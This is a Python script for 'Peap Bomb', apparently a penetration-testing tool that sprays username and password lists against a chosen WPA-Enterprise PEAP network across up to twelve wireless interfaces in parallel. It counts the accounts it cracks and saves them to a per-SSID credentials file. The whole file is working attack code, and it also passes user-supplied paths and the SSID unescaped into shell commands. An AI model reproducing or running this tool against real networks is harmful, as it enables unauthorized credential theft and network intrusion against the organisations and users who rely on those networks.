import atexit
import pathlib
import readline
import datetime
import subprocess
import os
from multiprocessing import Process
import importlib
from importlib import util

#######################################################################################
# Peap Bomb was created by Marantral infiltration.jedi@gmail.com and Abricto Security.#
# Change the driver to the appropriate one based on the equipment that you are using. #
#######################################################################################

driver = "nl80211"  # Should work for most applications, but might need to be changed.

history = os.path.join(os.path.expanduser("~"), ".peap_bomb_history")

try:
    readline.read_history_file(history)
    h_len = readline.get_current_history_length()
except FileNotFoundError:
    open(history, 'wb').close()
    h_len = 0


def save(prev_h_len, history):
    new_h_len = readline.get_current_history_length()
    readline.set_history_length(1000)
    readline.append_history_file(new_h_len - prev_h_len, history)


atexit.register(save, h_len, history)
conf = "./conf/"
res = "./Results/"
try:
    os.makedirs(conf)
except OSError:
    pass
try:
    os.makedirs(res)
except OSError:
    pass


class color:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    WHITE = '\033[97m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


spec = importlib.util.find_spec('.connect', package='lib')
c = spec.loader.load_module()

spec = importlib.util.find_spec('.clean', package='lib')
a = spec.loader.load_module()


def bomb():
    print(color.BLUE + r"""
          __________                          __________              ___.   
          \______   \ ____ _____  ______      \______   \ ____   _____\_ |__  
           |     ___// __ \\__  \ \____ \      |    |  _//  _ \ /     \| __ \ 
           |    |   \  ___/ / __ \|  |_> >     |    |   (  <_> )  Y Y  \ \_\ \
           |____|    \___  >____  /   __/      |______  /\____/|__|_|  /___  /
                         \/     \/|__|                \/             \/    \/                               
""" + color.RED)
    print("""
                  MW0kkOXWMMMMMMMMMMMMMWOxkxxKMMMMMMMMMMMMMMMXOkkKWM
                  N0O0kolxKWMMMMMMMMMMMWkloloKMMMMMMMMMMMMWKxook0O0N
                  kkOkoc;';lkXWMMMMMMMMWx,,':0WMMMMMMMMWXkl;,;cokOOO
                  dkxl:,'....,lxKNMWXK0Oc...'cxkOXWMNKxl,...'',:lxkd
                  xlc;,'......  .,lkOO00l....:llllol,.   .....',;clx
                  Xo,''.....     ,dKXKK0c.  .:lllll;.     ......',oX
                  M0:.....     .cOXNKKK0c   .:lllllol,      .....:0M
                  MWk,...     .o0NNXKKK0c   .:llllolll;.     ...,kWM
                  MMWd.      .d0XWNKKKK0c   .:oollollol;.     ..dWMM
                  MMMXl.    .l0KNNK00000c   .:lloddlllll;     .lXMMM
                  MMMMXdlll:ck0XNK00000Oo,'';oxkO0kollllc;;llldXMMMM
                  MMMMMMMMWOk0XWWXKKKKKK0000000KKK0xolooockWMMMMMMMM
                  MMMMMMMMNkkKNMWKKKKKKKKKKKKKKKKKKkolooocdXMMMMMMMM
                  MMMMMMMMXkOKNMNKKKKKKKKKKKKKKKKKKOdlooocoKMMMMMMMM
                  MMMMMMMMKxkKNWX000000000000000000OdllllcoKMMMMMMMM
                  MMMMMMMMXkk0XNX000000000000000000OdllllcoKMMMMMMMM
                  MMMMMMMMNkkKNMWXKKKKKKKKKKKKKKKKKOdlloocdXMMMMMMMM
                  MMMMMMMMWOx0XWWXKKKKKKKKKKKKKKKK0kollllckWMMMMMMMM
                  MMMMMMMMMXkOKNWNKKKKKKKKKKKKKKKK0xollocl0MMMMMMMMM
                  MMMMMMMMMW0xOKXNK000000000000000kollllcxWMMMMMMMMM
                  MMMMMMMMMMNOxOKXX00000000000000OxllllcoXMMMMMMMMMM
                  MMMMMMMMMMMNOk0XNXKKKKKKK0KKKK0OdlolcoKMMMMMMMMMMM
                  MMMMMMMMMMMMN0kOKXXKKKKKKKKKKKOxollcdXMMMMMMMMMMMM
                  MMMMMMMMMMMMMWXOk0KKKKKKKKKKK0xolcoONMMMMMMMMMMMMM
                  MMMMMMMMMMMMMMMWKOOkO00KKKK00xlod0NMMMMMMMMMMMMMMM
                  MMMMMMMMMMMMMMMMMWXOxxxxxxxxddkKWMMMMMMMMMMMMMMMMM
    """)

    print(color.END + """\
                            Created By Marantral The Mantroll
                         Abricto Security - abrictosecurity.com
                                     version 0.2
    """)
    print(
        color.GREEN + color.BOLD + "\nFor your convenience here are all the interfaces that seem to be wireless:" + color.RED)
    wire = "ifconfig | grep w | cut -d ':' -f 1"
    subprocess.call(wire, shell=True)
    count = input(color.BLUE + "\n\tWhat are the amount wireless interfaces that we are using?:  " + color.END)
    try:
        val = int(count)
    except ValueError:
        try:
            val = float(count)
        except ValueError:
            print(color.RED + color.BOLD + "\tERROR!!!!: THAT IS NOT A NUMBER!\n\n" + color.END)
            exit()
    if val > 12:
        print(color.RED + color.BOLD + "\tERROR!!!!: THAT IS TOO MANY INTERFACES!\n\n" + color.END)
        exit()

    if val >= 1:
        face1 = input(color.BLUE + "\n\tWhat is the wireless interface that we are using?:  " + color.END)

    if val >= 2:
        face2 = input(color.BLUE + "\n\tWhat is the 2nd wireless interface that we are using?:  " + color.END)

    if val >= 3:
        face3 = input(color.BLUE + "\n\tWhat is the 3rd wireless interface that we are using?:  " + color.END)

    if val >= 4:
        face4 = input(color.BLUE + "\n\tWhat is the 4th wireless interface that we are using?:  " + color.END)

    if val >= 5:
        face5 = input(color.BLUE + "\n\tWhat is the 5th wireless interface that we are using?:  " + color.END)

    if val >= 6:
        face6 = input(color.BLUE + "\n\tWhat is the 6th wireless interface that we are using?:  " + color.END)

    if val >= 7:
        face7 = input(color.BLUE + "\n\tWhat is the 7th wireless interface that we are using?:  " + color.END)

    if val >= 8:
        face8 = input(color.BLUE + "\n\tWhat is the 8th wireless interface that we are using?:  " + color.END)

    if val >= 9:
        face9 = input(color.BLUE + "\n\tWhat is the 9th wireless interface that we are using?:  " + color.END)

    if val >= 10:
        face10 = input(color.BLUE + "\n\tWhat is the 10th wireless interface that we are using?:  " + color.END)

    if val >= 11:
        face11 = input(color.BLUE + "\n\tWhat is the 11th wireless interface that we are using?:  " + color.END)

    if val >= 12:
        face12 = input(color.BLUE + "\n\tWhat is the 12th wireless interface that we are using?:  " + color.END)

    user1 = input(color.BLUE + "\n\tWhere is the file with usernames located?:  " + color.END)
    user = pathlib.Path(user1)
    if user.exists():
        pass
    else:
        print(color.RED + color.BOLD + "\tERROR!!!!: FILE DOES NOT EXIST!\n\n" + color.END)
        exit()
    linecount = "wc -l " + user1 + " | cut -d ' ' -f 1 > " + conf + "ln"
    subprocess.call(linecount, shell=True)
    l = open(conf + "ln", 'r')
    base = l.readline().strip()
    val2 = int(base)
    split = val2 // val + 1
    spl = str(split)
    split2 = "split --lines=" + spl + " " + user1 + " " + conf + "users"
    subprocess.call(split2, shell=True)

    password1 = input(color.BLUE + "\n\tWhere is the file with possible passwords located?:  " + color.END)
    password = pathlib.Path(password1)
    if password.exists():
        pass
    else:
        print(color.RED + color.BOLD + "\tERROR!!!!: FILE DOES NOT EXIST!\n\n" + color.END)
        exit()
    passwd = open(password, "r")
    try:
        users1 = open(conf + "usersaa", "r")
    except:
        print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
        exit()
    if val >= 2:
        try:
            users2 = open(conf + "usersab", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()
    if val >= 3:
        try:
            users3 = open(conf + "usersac", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()
    if val >= 4:
        try:
            users4 = open(conf + "usersad", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()

    if val >= 5:
        try:
            users5 = open(conf + "usersae", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()
    if val >= 6:
        try:
            users6 = open(conf + "usersaf", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()
    if val >= 7:
        try:
            users7 = open(conf + "usersag", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()
    if val >= 8:
        try:
            users8 = open(conf + "usersah", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()
    if val >= 9:
        try:
            users9 = open(conf + "usersai", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()

    if val >= 10:
        try:
            users10 = open(conf + "usersaj", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()
    if val >= 11:
        try:
            users11 = open(conf + "usersak", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()
    if val >= 12:
        try:
            users12 = open(conf + "usersal", "r")
        except:
            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
            exit()

    user_list1 = []
    user_list2 = []
    user_list3 = []
    user_list4 = []
    user_list5 = []
    user_list6 = []
    user_list7 = []
    user_list8 = []
    user_list9 = []
    user_list10 = []
    user_list11 = []
    user_list12 = []
    passwords = []

    for f in users1:
        current_place = f[:-1]
        user_list1.append(current_place)

    if val >= 2:
        for f in users2:
            current_place = f[:-1]
            user_list2.append(current_place)

    if val >= 3:
        for f in users3:
            current_place = f[:-1]
            user_list3.append(current_place)

    if val >= 4:
        for f in users4:
            current_place = f[:-1]
            user_list4.append(current_place)

    if val >= 5:
        for f in users5:
            current_place = f[:-1]
            user_list5.append(current_place)

    if val >= 6:
        for f in users6:
            current_place = f[:-1]
            user_list6.append(current_place)
    if val >= 7:
        for f in users7:
            current_place = f[:-1]
            user_list7.append(current_place)

    if val >= 8:
        for f in users8:
            current_place = f[:-1]
            user_list8.append(current_place)

    if val >= 9:
        for f in users9:
            current_place = f[:-1]
            user_list9.append(current_place)

    if val >= 10:
        for f in users10:
            current_place = f[:-1]
            user_list10.append(current_place)

    if val >= 11:
        for f in users11:
            current_place = f[:-1]
            user_list11.append(current_place)

    if val >= 11:
        for f in users11:
            current_place = f[:-1]
            user_list11.append(current_place)

    if val >= 12:
        for f in users12:
            current_place = f[:-1]
            user_list12.append(current_place)

    for f in passwd:
        current_place1 = f[:-1]
        passwords.append(current_place1)

    ssid = input(color.BLUE + "\n\tWhat is the PEAP SSID that you want to target?:  " + color.END)
    clock_start = datetime.datetime.now()
    print("\n\tTry started: ", clock_start)
    if val == 1:
        a.clean(face1)
        for password in passwords:
            p = Process(target=c.connection1, args=(password, user_list1, face1, ssid,))
            p.start()
            p.join()
    if val == 2:
        a.clean2(face1, face2)
        for password in passwords:
            p = Process(target=c.connection1, args=(password, user_list1, face1, ssid,))
            p2 = Process(target=c.connection2, args=(password, user_list2, face2, ssid,))
            p.start()
            p2.start()
            p.join()
            p2.join()

    if val == 3:
        a.clean3(face1, face2, face3)
        for password in passwords:
            p = Process(target=c.connection1, args=(password, user_list1, face1, ssid,))
            p2 = Process(target=c.connection2, args=(password, user_list2, face2, ssid,))
            p3 = Process(target=c.connection3, args=(password, user_list3, face3, ssid,))
            p.start()
            p2.start()
            p3.start()
            p.join()
            p2.join()
            p3.join()

    if val == 4:
        a.clean4(face1, face2, face3, face4)
        for password in passwords:
            p = Process(target=c.connection1, args=(password, user_list1, face1, ssid,))
            p2 = Process(target=c.connection2, args=(password, user_list2, face2, ssid,))
            p3 = Process(target=c.connection3, args=(password, user_list3, face3, ssid,))
            p4 = Process(target=c.connection4, args=(password, user_list4, face4, ssid,))
            p.start()
            p2.start()
            p3.start()
            p4.start()
            p.join()
            p2.join()
            p3.join()
            p4.join()
    if val == 5:
        a.clean5(face1, face2, face3, face4, face5)
        for password in passwords:
            p = Process(target=c.connection1, args=(password, user_list1, face1, ssid,))
            p2 = Process(target=c.connection2, args=(password, user_list2, face2, ssid,))
            p3 = Process(target=c.connection3, args=(password, user_list3, face3, ssid,))
            p4 = Process(target=c.connection4, args=(password, user_list4, face4, ssid,))
            p5 = Process(target=c.connection5, args=(password, user_list5, face5, ssid,))
            p.start()
            p2.start()
            p3.start()
            p4.start()
            p5.start()
            p.join()
            p2.join()
            p3.join()
            p4.join()
            p5.join()
    if val == 6:
        a.clean6(face1, face2, face3, face4, face5, face6)
        for password in passwords:
            p = Process(target=c.connection1, args=(password, user_list1, face1, ssid,))
            p2 = Process(target=c.connection2, args=(password, user_list2, face2, ssid,))
            p3 = Process(target=c.connection3, args=(password, user_list3, face3, ssid,))
            p4 = Process(target=c.connection4, args=(password, user_list4, face4, ssid,))
            p5 = Process(target=c.connection5, args=(password, user_list5, face5, ssid,))
            p6 = Process(target=c.connection6, args=(password, user_list6, face6, ssid,))
            p.start()
            p2.start()
            p3.start()
            p4.start()
            p5.start()
            p6.start()
            p.join()
            p2.join()
            p3.join()
            p4.join()
            p5.join()
            p6.join()
    if val == 7:
        a.clean7(face1, face2, face3, face4, face5, face6, face7)
        for password in passwords:
            p = Process(target=c.connection1, args=(password, user_list1, face1, ssid,))
            p2 = Process(target=c.connection2, args=(password, user_list2, face2, ssid,))
            p3 = Process(target=c.connection3, args=(password, user_list3, face3, ssid,))
            p4 = Process(target=c.connection4, args=(password, user_list4, face4, ssid,))
            p5 = Process(target=c.connection5, args=(password, user_list5, face5, ssid,))
            p6 = Process(target=c.connection6, args=(password, user_list6, face6, ssid,))
            p7 = Process(target=c.connection7, args=(password, user_list7, face7, ssid,))
            p.start()
            p2.start()
            p3.start()
            p4.start()
            p5.start()
            p6.start()
            p7.start()
            p.join()
            p2.join()
            p3.join()
            p4.join()
            p5.join()
            p6.join()
            p7.join()
    if val == 8:
        a.clean8(face1, face2, face3, face4, face5, face6, face7, face8)
        for password in passwords:
            p = Process(target=c.connection1, args=(password, user_list1, face1, ssid,))
            p2 = Process(target=c.connection2, args=(password, user_list2, face2, ssid,))
            p3 = Process(target=c.connection3, args=(password, user_list3, face3, ssid,))
            p4 = Process(target=c.connection4, args=(password, user_list4, face4, ssid,))
            p5 = Process(target=c.connection5, args=(password, user_list5, face5, ssid,))
            p6 = Process(target=c.connection6, args=(password, user_list6, face6, ssid,))
            p7 = Process(target=c.connection7, args=(password, user_list7, face7, ssid,))
            p8 = Process(target=c.connection8, args=(password, user_list8, face8, ssid,))
            p.start()
            p2.start()
            p3.start()
            p4.start()
            p5.start()
            p6.start()
            p7.start()
            p8.start()
            p.join()
            p2.join()
            p3.join()
            p4.join()
            p5.join()
            p6.join()
            p7.join()
            p8.join()
    if val == 9:
        a.clean9(face1, face2, face3, face4, face5, face6, face7, face8, face9)
        for password in passwords:
            p = Process(target=c.connection1, args=(password, user_list1, face1, ssid,))
            p2 = Process(target=c.connection2, args=(password, user_list2, face2, ssid,))
            p3 = Process(target=c.connection3, args=(password, user_list3, face3, ssid,))
            p4 = Process(target=c.connection4, args=(password, user_list4, face4, ssid,))
            p5 = Process(target=c.connection5, args=(password, user_list5, face5, ssid,))
            p6 = Process(target=c.connection6, args=(password, user_list6, face6, ssid,))
            p7 = Process(target=c.connection7, args=(password, user_list7, face7, ssid,))
            p8 = Process(target=c.connection8, args=(password, user_list8, face8, ssid,))
            p9 = Process(target=c.connection9, args=(password, user_list9, face9, ssid,))
            p.start()
            p2.start()
            p3.start()
            p4.start()
            p5.start()
            p6.start()
            p7.start()
            p8.start()
            p9.start()
            p.join()
            p2.join()
            p3.join()
            p4.join()
            p5.join()
            p6.join()
            p7.join()
            p8.join()
            p9.join()
    if val == 10:
        a.clean10(face1, face2, face3, face4, face5, face6, face7, face8, face9, face10)
        for password in passwords:
            p = Process(target=c.connection1, args=(password, user_list1, face1, ssid,))
            p2 = Process(target=c.connection2, args=(password, user_list2, face2, ssid,))
            p3 = Process(target=c.connection3, args=(password, user_list3, face3, ssid,))
            p4 = Process(target=c.connection4, args=(password, user_list4, face4, ssid,))
            p5 = Process(target=c.connection5, args=(password, user_list5, face5, ssid,))
            p6 = Process(target=c.connection6, args=(password, user_list6, face6, ssid,))
            p7 = Process(target=c.connection7, args=(password, user_list7, face7, ssid,))
            p8 = Process(target=c.connection8, args=(password, user_list8, face8, ssid,))
            p9 = Process(target=c.connection9, args=(password, user_list9, face9, ssid,))
            p10 = Process(target=c.connection10, args=(password, user_list10, face10, ssid,))
            p.start()
            p2.start()
            p3.start()
            p4.start()
            p5.start()
            p6.start()
            p7.start()
            p8.start()
            p9.start()
            p10.start()
            p.join()
            p2.join()
            p3.join()
            p4.join()
            p5.join()
            p6.join()
            p7.join()
            p8.join()
            p9.join()
            p10.join()
    if val == 11:
        a.clean11(face1, face2, face3, face4, face5, face6, face7, face8, face9, face10, face11)
        for password in passwords:
            p = Process(target=c.connection1, args=(password, user_list1, face1, ssid,))
            p2 = Process(target=c.connection2, args=(password, user_list2, face2, ssid,))
            p3 = Process(target=c.connection3, args=(password, user_list3, face3, ssid,))
            p4 = Process(target=c.connection4, args=(password, user_list4, face4, ssid,))
            p5 = Process(target=c.connection5, args=(password, user_list5, face5, ssid,))
            p6 = Process(target=c.connection6, args=(password, user_list6, face6, ssid,))
            p7 = Process(target=c.connection7, args=(password, user_list7, face7, ssid,))
            p8 = Process(target=c.connection8, args=(password, user_list8, face8, ssid,))
            p9 = Process(target=c.connection9, args=(password, user_list9, face9, ssid,))
            p10 = Process(target=c.connection10, args=(password, user_list10, face10, ssid,))
            p11 = Process(target=c.connection11, args=(password, user_list11, face11, ssid,))
            p.start()
            p2.start()
            p3.start()
            p4.start()
            p5.start()
            p6.start()
            p7.start()
            p8.start()
            p9.start()
            p10.start()
            p11.start()
            p.join()
            p2.join()
            p3.join()
            p4.join()
            p5.join()
            p6.join()
            p7.join()
            p8.join()
            p9.join()
            p10.join()
            p11.join()
    if val == 12:
        a.clean12(face1, face2, face3, face4, face5, face6, face7, face8, face9, face10, face11, face12)
        for password in passwords:
            p = Process(target=c.connection1, args=(password, user_list1, face1, ssid,))
            p2 = Process(target=c.connection2, args=(password, user_list2, face2, ssid,))
            p3 = Process(target=c.connection3, args=(password, user_list3, face3, ssid,))
            p4 = Process(target=c.connection4, args=(password, user_list4, face4, ssid,))
            p5 = Process(target=c.connection5, args=(password, user_list5, face5, ssid,))
            p6 = Process(target=c.connection6, args=(password, user_list6, face6, ssid,))
            p7 = Process(target=c.connection7, args=(password, user_list7, face7, ssid,))
            p8 = Process(target=c.connection8, args=(password, user_list8, face8, ssid,))
            p9 = Process(target=c.connection9, args=(password, user_list9, face9, ssid,))
            p10 = Process(target=c.connection10, args=(password, user_list10, face10, ssid,))
            p11 = Process(target=c.connection11, args=(password, user_list11, face11, ssid,))
            p12 = Process(target=c.connection12, args=(password, user_list11, face12, ssid,))
            p.start()
            p2.start()
            p3.start()
            p4.start()
            p5.start()
            p6.start()
            p7.start()
            p8.start()
            p9.start()
            p10.start()
            p11.start()
            p12.start()
            p.join()
            p2.join()
            p3.join()
            p4.join()
            p5.join()
            p6.join()
            p7.join()
            p8.join()
            p9.join()
            p10.join()
            p11.join()
            p12.join()

    clock_stop = datetime.datetime.now()
    print("\n\tScan Started On: ", clock_start)
    print("\n\tScan Ended On: ", clock_stop)
    linecount2 = "wc -l " + res + ssid + "_creds.txt | cut -d ' ' -f 1 > " + conf + "ln2"
    subprocess.call(linecount2, shell=True)
    l2 = open(conf + "ln2", 'r')
    base2 = l2.readline().strip()
    print(
        "\n\tWe were able to get: " + color.GREEN + color.BOLD + base2 + color.END + " out of " + color.GREEN + color.BOLD + base + color.END + " possible users!!!")
    print("\n\tAll valid credentials are in: " + color.BLUE + res + ssid + "_creds.txt" + color.END)


if __name__ == "__main__":
    bomb()
